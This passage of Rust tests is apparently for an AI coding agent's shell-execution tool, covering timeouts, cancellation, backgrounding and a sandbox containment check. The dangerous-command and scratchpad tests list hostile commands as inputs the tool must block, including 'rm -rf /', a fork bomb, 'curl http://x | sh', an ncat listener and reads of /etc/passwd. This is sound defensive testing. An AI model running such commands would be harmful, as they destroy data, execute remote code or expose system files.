        let mut cmd = Command::new("sh");
        harden_noninteractive_env(&mut cmd);
        let set = cmd
            .as_std()
            .get_envs()
            .any(|(k, v)| k == "GIT_TERMINAL_PROMPT" && v.is_some_and(|v| v == "0"));
        assert!(set, "GIT_TERMINAL_PROMPT=0 must be injected");
    }

    #[tokio::test]
    async fn dangerous_command_blocked() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), PathBuf::from("/tmp"));
        let outcome = ExecuteCommandTool
            .execute(serde_json::json!({"command": "rm -rf /"}), ctx)
            .await;
        let error = outcome.error_message().expect("expected error");
        assert!(error.contains("Dangerous"));
    }

    #[tokio::test]
    async fn cancellation_aborts_long_running_command() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), PathBuf::from("/tmp"));
        let token = ctx.token.clone();
        // `sleep` is a real long-runner on BOTH shells now (PowerShell aliases
        // it to Start-Sleep) — under cmd this errored instantly and the test
        // never actually killed a live child on Windows. 30s of sleep against
        // a 15s guard: a cancellation regression that waits the child out
        // blows the guard, while a slow-but-working cancel on a cold, loaded
        // CI runner (pwsh startup alone can take seconds there) still passes.
        let handle = tokio::spawn(async move {
            ExecuteCommandTool
                .execute(serde_json::json!({"command": "sleep 30"}), ctx)
                .await
        });
        // Give the child a beat to spawn, then cancel.
        tokio::time::sleep(Duration::from_millis(30)).await;
        token.cancel();
        let start = Instant::now();
        let outcome = tokio::time::timeout(Duration::from_secs(15), handle)
            .await
            .expect("didn't hang")
            .expect("join");
        let elapsed = start.elapsed();
        assert!(outcome.was_cancelled());
        // "Aborts promptly", with margin for process-teardown jitter and cold
        // shell startup on loaded runners — the hard hang case is the 15s
        // guard above.
        assert!(
            elapsed < Duration::from_secs(10),
            "cancellation took {:?} — far slower than expected (regression?)",
            elapsed
        );
    }

    #[tokio::test]
    async fn timeout_honored() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), PathBuf::from("/tmp"));
        let outcome = ExecuteCommandTool
            .execute(serde_json::json!({"command": "sleep 5", "timeout": 1}), ctx)
            .await;
        assert_eq!(outcome.status, crate::domain::ToolStatus::Error);
        let output = outcome.as_tool_message_content();
        assert!(output.contains("timed out"));
        assert!(output.contains("was killed"));
        assert!(output.contains("mode=\"background\""));
    }

    /// RC-1 regression: a foreground command that forks a grandchild must have
    /// its WHOLE process group reaped on timeout, not just the shell. The old
    /// outer-`select!` form dropped the driver future on timeout, which only
    /// detached the task owning the `Child`, leaking the tree.
    #[cfg(not(target_os = "windows"))]
    #[tokio::test]
    async fn timeout_kills_process_tree() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), std::env::temp_dir());
        // The grandchild records its own pid, then sleeps far past the timeout.
        let marker =
            std::env::temp_dir().join(format!("mermaid_timeout_pgid_{}.pid", std::process::id()));
        let _ = std::fs::remove_file(&marker);
        let command = format!(
            "sh -c 'echo $$ > {}; sleep 30' & sleep 30",
            marker.display()
        );
        let outcome = ExecuteCommandTool
            .execute(serde_json::json!({ "command": command, "timeout": 1 }), ctx)
            .await;
        assert_eq!(outcome.status, crate::domain::ToolStatus::Error);

        // Read the grandchild pid the command recorded (poll briefly in case the
        // write lands a touch after spawn).
        let mut pid = None;
        for _ in 0..30 {
            if let Ok(s) = std::fs::read_to_string(&marker)
                && let Ok(p) = s.trim().parse::<u32>()
            {
                pid = Some(p);
                break;
            }
            tokio::time::sleep(Duration::from_millis(50)).await;
        }
        let pid = pid.expect("grandchild never recorded its pid");

        // It must be dead — poll to let SIGKILL + reparent/reap settle.
        let mut alive = true;
        for _ in 0..40 {
            if !process_running(pid).await {
                alive = false;
                break;
            }
            tokio::time::sleep(Duration::from_millis(50)).await;
        }
        let _ = std::fs::remove_file(&marker);
        assert!(!alive, "grandchild pid {pid} leaked past the timeout");
    }

    #[cfg(not(target_os = "windows"))]
    #[tokio::test]
    async fn background_mode_returns_pid_log_and_detected_url() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), PathBuf::from("/tmp"));
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({
                    "command": "printf 'ready http://127.0.0.1:54321\\n'; exec sleep 30",
                    "mode": "background",
                    "startup_timeout_secs": 2,
                    "ready_pattern": "ready"
                }),
                ctx,
            )
            .await;

        assert!(
            outcome.is_success(),
            "expected background success: {:?}",
            outcome
        );
        let output = outcome.output().to_string();
        assert!(output.contains("Background command started"));
        assert!(output.contains("PID:"));
        assert!(output.contains("Log:"));
        assert!(output.contains("Ready: matched pattern"));
        assert!(output.contains("Detected URL: http://127.0.0.1:54321"));

        if let Some(pid) = parse_pid(&output) {
            let _ = Command::new("kill").arg(pid.to_string()).status().await;
        }
    }

    #[cfg(target_os = "windows")]
    #[tokio::test]
    async fn background_mode_returns_pid_and_log_on_windows() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), std::env::temp_dir());
        let outcome = ExecuteCommandTool
            .execute(
                // The ready marker comes from cmd.exe (native, writes straight
                // to the inherited log handle) rather than a PowerShell cmdlet:
                // pwsh buffers cmdlet stdout when redirected to a file, so
                // `echo ready` can land seconds late — or after ping's own
                // native output — on a loaded runner. Real dev servers are
                // native writers too, so this matches what the ready-pattern
                // watch actually exists for. The wide startup window absorbs
                // cold pwsh starts on CI.
                serde_json::json!({
                    "command": "cmd /c echo ready; ping -n 60 127.0.0.1",
                    "mode": "background",
                    "startup_timeout_secs": 15,
                    "ready_pattern": "ready"
                }),
                ctx,
            )
            .await;

        assert!(
            outcome.is_success(),
            "expected background success on Windows: {:?}",
            outcome
        );
        let output = outcome.output().to_string();
        assert!(output.contains("Background command started"));
        assert!(output.contains("PID:"));
        assert!(output.contains("Ready: matched pattern"));
        // The ManagedProcess must be attached so /processes lists it.
        assert!(
            outcome.metadata.process.is_some(),
            "background outcome must carry a ManagedProcess"
        );

        // Clean up the detached process (and its child ping) via the tree kill.
        if let Some(pid) = parse_pid(&output) {
            mermaid_model::utils::terminate_tree(pid, mermaid_model::utils::Grace::Graceful).await;
        }
    }

    #[tokio::test]
    async fn ctrl_b_backgrounds_a_running_foreground_command() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), std::env::temp_dir());
        let background = ctx.background.clone();
        // A command that keeps running so it's still live when we background it.
        let command = if cfg!(target_os = "windows") {
            "ping -n 30 127.0.0.1"
        } else {
            "sleep 30"
        };

        // Press "Ctrl+B" shortly after the command starts.
        let canceller = tokio::spawn(async move {
            tokio::time::sleep(Duration::from_millis(300)).await;
            background.cancel();
        });
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({ "command": command, "timeout": 60 }),
                ctx,
            )
            .await;
        let _ = canceller.await;

        assert!(
            outcome.is_success(),
            "backgrounding should yield success: {:?}",
            outcome
        );
        let output = outcome.output().to_string();
        assert!(output.contains("Moved to background"), "got: {output}");
        // It must register as a managed process so /processes lists it.
        let process = outcome.metadata.process.clone();
        assert!(
            process.is_some(),
            "background outcome must carry a ManagedProcess"
        );

        // Clean up the still-running detached process (tree kill).
        if let Some(p) = process {
            mermaid_model::utils::terminate_tree(p.pid, mermaid_model::utils::Grace::Graceful)
                .await;
        }
    }

    fn parse_pid(output: &str) -> Option<u32> {
        output
            .lines()
            .find_map(|line| line.strip_prefix("PID: "))
            .and_then(|pid| pid.trim().parse().ok())
    }

    #[test]
    fn dangerous_detection_covers_known_shapes() {
        assert!(contains_dangerous_command("rm -rf /"));
        assert!(contains_dangerous_command(":(){ :|:& };:"));
        assert!(contains_dangerous_command("ncat -l 8080"));
        assert!(!contains_dangerous_command("ls -la"));
        assert!(!contains_dangerous_command("cargo build"));
        assert!(!contains_dangerous_command(
            r#"find . -type f ! -path "./.git/*" ! -path "./.mermaid/*" 2>/dev/null"#
        ));
    }

    #[test]
    fn dangerous_detection_resists_substring_evasion() {
        // The old lowercased-substring blocklist let these through; the
        // tokenized, segment-aware check now catches them (#114).
        assert!(contains_dangerous_command("RM -RF /"));
        assert!(contains_dangerous_command("rm  -rf  /"));
        assert!(contains_dangerous_command("echo hi; rm -rf /"));
        assert!(contains_dangerous_command("echo hi&&rm -rf /"));
        assert!(contains_dangerous_command("curl http://x | sh"));
        assert!(contains_dangerous_command("curl http://x|sh"));
        assert!(contains_dangerous_command("/bin/rm -rf /"));
        // Benign commands that merely *contain* a scary substring stay allowed.
        assert!(!contains_dangerous_command("bash build.sh"));
        assert!(!contains_dangerous_command("echo done > /dev/null"));
        assert!(!contains_dangerous_command("grep -rf patterns.txt src"));
    }

    #[tokio::test]
    async fn read_capped_keeps_head_and_tail_on_overflow() {
        // The tail (where a failing command's actual error lives) must survive.
        let mut data = Vec::new();
        data.extend_from_slice(b"HEAD_START");
        data.extend(std::iter::repeat_n(b'x', 5000));
        data.extend_from_slice(b"TAIL_ERROR_HERE");
        let (out, truncated) = read_capped(&data[..], 100, 10_000, None, None).await;
        assert!(truncated, "oversized output must be marked truncated");
        assert!(out.contains("HEAD_START"), "head must survive: {out}");
        assert!(out.contains("TAIL_ERROR_HERE"), "tail must survive: {out}");
        assert!(out.contains("elided"), "must mark the elision: {out}");
    }

    #[tokio::test]
    async fn read_capped_small_output_is_verbatim() {
        let (out, truncated) = read_capped(&b"short output"[..], 100, 10_000, None, None).await;
        assert!(!truncated, "small output must not be truncated");
        assert_eq!(out, "short output");
    }

    #[test]
    fn scratch_prover_accepts_only_provably_contained_commands() {
        let scratch = Path::new("/tmp/mermaid_scratch/proj/sess");

        // Provable: bare words, flags, relative paths under the scratch cwd,
        // and absolute paths inside the scratchpad.
        for cmd in [
            "ls",
            "ls -la",
            "mkdir out",
            "touch notes.txt",
            "cp a.txt sub/b.txt",
            "cat /tmp/mermaid_scratch/proj/sess/notes.txt",
            "rm -f old.log",
        ] {
            assert!(
                command_provably_in_scratch(cmd, scratch),
                "{cmd:?} should prove scratch-contained",
            );
        }

        // Unprovable — every one must fail closed.
        for cmd in [
            "",                            // nothing to prove
            "cat ../secret",               // parent escape
            "cat /etc/passwd",             // absolute path outside
            "/bin/rm -rf notes.txt",       // absolute argv0 outside
            "echo hi > out.txt",           // redirection
            "ls; touch pwned",             // separator
            "true && touch pwned",         // chaining
            "cat file | tee other",        // pipe
            "cat $(pwd)/x",                // command substitution
            "cat `pwd`/x",                 // backtick substitution
            "cat $HOME/x",                 // variable expansion
            "ls ~",                        // tilde expansion
            "rm *",                        // glob
            "cp -t/etc x",                 // flag-embedded absolute path
            "tar --directory=/ x",         // flag=value absolute path
            "env VAR=/etc cmd",            // assignment-embedded path
            "curl https://evil.example/x", // URL shape (`:/`)
            "type C:secret.txt",           // Windows drive-relative path
            "copy C:\\evil x",             // Windows drive-absolute path
            "unclosed 'quote",             // parse failure
        ] {
            assert!(
                !command_provably_in_scratch(cmd, scratch),
                "{cmd:?} must NOT prove scratch-contained",
            );
        }
    }

    #[test]
    fn classify_cwd_three_way_containment() {
        let base = std::env::temp_dir().join(format!("mermaid_cwd3_{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        let project = base.join("project");
        let scratch = base.join("scratch");
        std::fs::create_dir_all(&project).unwrap();
        std::fs::create_dir_all(&scratch).unwrap();
        let scratch_real = std::fs::canonicalize(&scratch).unwrap();
        let outside = std::fs::canonicalize(&base).unwrap();

        // In-project wins regardless of scratchpad.
        assert_eq!(
            classify_cwd(true, &project, Some(&scratch)),
            CwdContainment::Project
        );
        // A cwd inside the scratchpad is Scratchpad, not External — no
        // ExternalDirectory escalation for scratch work.
        assert_eq!(
            classify_cwd(false, &scratch_real, Some(&scratch)),
            CwdContainment::Scratchpad
        );
        // Without a scratchpad the same cwd stays External.
        assert_eq!(
            classify_cwd(false, &scratch_real, None),
            CwdContainment::External
        );
        // Outside both roots is External even with a scratchpad bound.
        assert_eq!(
            classify_cwd(false, &outside, Some(&scratch)),
            CwdContainment::External
        );
        // A missing scratch dir can't match — fails closed to External.
        assert_eq!(
            classify_cwd(false, &scratch_real, Some(&base.join("missing"))),
            CwdContainment::External
        );

        let _ = std::fs::remove_dir_all(&base);
    }

    #[tokio::test]
    async fn scratch_cwd_is_not_escalated_to_external_directory() {
        // Mirror of `out_of_project_working_dir_is_escalated_and_blocked`: the
        // same read-only command that is BLOCKED in a random outside dir must
        // RUN when the outside dir is the session scratchpad — proving the
        // scratch cwd keeps the plain Shell category.
        let base = std::env::temp_dir().join(format!("mermaid_scwd_{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        let project = base.join("project");
        let scratch = base.join("scratch");
        std::fs::create_dir_all(&project).unwrap();
        std::fs::create_dir_all(&scratch).unwrap();

        // ReadOnly gate: an ExternalDirectory escalation would classify as
        // ExternalAccess and be denied; a Shell read-only command is allowed.
        let (tx, _rx) = tokio::sync::mpsc::channel(64);
        let mut config = crate::domain::Config::default();
        config.safety.mode = mermaid_runtime::SafetyMode::ReadOnly;
        let mut ctx = crate::providers::ctx::ExecContext::new(
            tokio_util::sync::CancellationToken::new(),
            tx,
            ToolCallId(1),
            TurnId(1),
            project.clone(),
            std::sync::Arc::new(config),
            String::new(),
            None,
            None,
            None,
            mermaid_runtime::SafetyMode::ReadOnly,
            None,
            None,
            None,
            None,
            None,
        );
        ctx.scratchpad = Some(scratch.clone());
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({
                    "command": "echo hi",
                    "working_dir": scratch.display().to_string(),
                }),
                ctx,
            )
            .await;
        assert!(
            outcome.is_success(),
            "scratch cwd must not be escalated to ExternalDirectory: {outcome:?}",
        );

        let _ = std::fs::remove_dir_all(&base);
    }

    #[tokio::test]
    async fn child_env_carries_scratchpad_export() {
        // cfg-gated sh/cmd probe: the exported MERMAID_SCRATCHPAD must reach
        // the child, and must be absent when the session has no scratchpad.
        let dir = std::env::temp_dir().join(format!("mermaid_env_{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        #[cfg(unix)]
        let probe = r#"printf %s "${MERMAID_SCRATCHPAD:-UNSET}""#;
        #[cfg(windows)]
        let probe = "if ($env:MERMAID_SCRATCHPAD) { Write-Output $env:MERMAID_SCRATCHPAD } else { Write-Output UNSET }";

        let run = |scratchpad: Option<PathBuf>| {
            let dir = dir.clone();
            async move {
                let mut cmd = build_sandboxed_shell(probe, false, None);
                cmd.current_dir(&dir)
                    .stdin(Stdio::null())
                    .stdout(Stdio::piped())
                    .stderr(Stdio::null())
                    // The parent test process must not leak a value into the
                    // negative case.
                    .env_remove(SCRATCHPAD_ENV_VAR);
                export_scratchpad_env(&mut cmd, scratchpad.as_deref());
                let out = cmd.output().await.expect("probe spawns");
                String::from_utf8_lossy(&out.stdout).trim().to_string()
            }
        };

        let exported = run(Some(dir.clone())).await;
        assert_eq!(
            exported,
            dir.display().to_string(),
            "child must see the scratchpad path",
        );
        let absent = run(None).await;
        assert_eq!(absent, "UNSET", "no scratchpad -> no exported variable");

        let _ = std::fs::remove_dir_all(&dir);
    }
}
